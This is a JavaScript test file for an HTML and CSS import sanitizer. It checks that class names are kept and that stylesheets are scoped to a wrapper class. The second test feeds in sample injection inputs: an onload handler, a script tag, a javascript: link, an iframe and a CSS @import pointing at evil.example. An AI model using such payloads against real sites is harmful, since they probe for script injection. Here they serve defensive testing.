describe('the HTML and CSS halves agree', () => {
  /*
   * THE END TO END CHECK, and the one that would catch the two halves drifting
   * apart. The markup keeps a class, the stylesheet targets it, and the rule
   * still has something to match after both have run. A version of the class
   * filter that stripped Tailwind names passed every CSS test in this file and
   * would have failed exactly here.
   */
  it('leaves the stylesheet with something to match', () => {
    const source = '<div class="md:flex gap-4"><h2 class="title">Crete</h2></div>';
    const styles = '.md\\:flex { display: flex } .title { font-size: 2rem } .gap-4 { gap: 1rem }';

    const { html } = cleanImportHtml(source);
    const { css } = scopeImportCss(styles, { scope: `.${importScopeClass('abc')}` });

    for (const name of ['md:flex', 'gap-4', 'title']) {
      expect(html, `markup lost ${name}`).toContain(name);
    }

    expect(css).toContain('.tgi-abc .md\\:flex');
    expect(css).toContain('.tgi-abc .title');
    expect(css).toContain('.tgi-abc .gap-4');
    assertConfined(css, '.tgi-abc');
  });

  it('produces a section that is inert and confined from a hostile document', () => {
    const source =
      '<section class="hero" onload="alert(1)">' +
      '<script>alert(2)</script>' +
      '<style>body{background:red}</style>' +
      '<h1 id="t">Crete</h1>' +
      '<a href="javascript:alert(3)" target="_blank">Book</a>' +
      '<iframe src="https://evil.example"></iframe>' +
      '</section>';

    const styles = '@import url(https://evil.example/x.css); body { background: red } .hero { padding: 4rem }';

    const { html } = cleanImportHtml(source);
    const { css } = scopeImportCss(styles, { scope: SCOPE });

    assertInert(html);
    assertConfined(css, SCOPE);

    // And the design still arrived.
    expect(html).toContain('class="hero"');
    expect(html).toContain('<h1>Crete</h1>');
    expect(css).toContain('.tgi-test .hero');
    // body became the section itself rather than the visitor's whole page.
    expect(css).toContain('.tgi-test {');
  });
});
